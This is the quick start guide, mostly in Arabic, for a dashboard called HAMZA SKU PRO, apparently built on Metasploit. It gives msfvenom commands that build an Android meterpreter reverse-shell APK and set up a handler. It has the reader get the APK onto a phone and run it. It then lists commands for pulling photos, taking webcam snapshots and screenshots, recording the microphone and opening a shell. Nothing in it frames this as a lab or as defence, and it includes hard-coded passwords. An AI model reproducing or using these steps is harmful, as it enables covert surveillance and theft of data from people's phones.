# 🚀 Quick Start Guide

## التشغيل في 60 ثانية

### 1. التثبيت (مرة واحدة فقط):

```bash
cd HAMZA_SKU_PRO
sudo bash install.sh
```

---

### 2. التشغيل:

#### Terminal 1:
```bash
msfrpcd -P msf_password -S -a 127.0.0.1
```
**اترك هذا Terminal مفتوحاً!**

#### Terminal 2:
```bash
cd HAMZA_SKU_PRO
python3 server.py
```

---

### 3. المتصفح:

```
URL: http://localhost:5000
Password: hamza_sku_2026
```

---

### 4. Setup Handler:

```
LHOST: YOUR_IP (مثل 192.168.1.100)
LPORT: 443
PAYLOAD: android/meterpreter/reverse_tcp

→ START HANDLER
```

---

### 5. Create Payload:

```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=YOUR_IP \
  LPORT=443 \
  -o payload.apk
```

---

### 6. Install & Wait:

- انقل `payload.apk` للهاتف
- ثبّت + شغّل
- انتظر ظهور الجهاز في Dashboard!

---

## 🎯 الأوامر المهمة

### في Session Terminal:

```bash
# معلومات
sysinfo
getuid
pwd

# الملفات
ls
cd /sdcard
download /sdcard/photo.jpg

# الكاميرا
webcam_snap
screenshot

# الصوت
record_mic -d 30

# Shell
shell
```

---

## ⚠️ استكشاف الأخطاء السريع

### Handler لا يعمل؟

```bash
# أعد تشغيل msfrpcd
pkill msfrpcd
msfrpcd -P msf_password -S -a 127.0.0.1
```

### Dashboard لا يفتح؟

```bash
# تحقق من المنفذ
netstat -tulpn | grep 5000

# جرب منفذ آخر في server.py
```

### Session لا يظهر؟

```bash
# تأكد من نفس الشبكة
ping TARGET_IP

# تحقق من Firewall
sudo ufw status
```

---

## 📞 الدعم

للمساعدة، راجع `GUIDE.md` للدليل الكامل.

---

🔥 **HAMZA SKU - Ready in 60 seconds!**
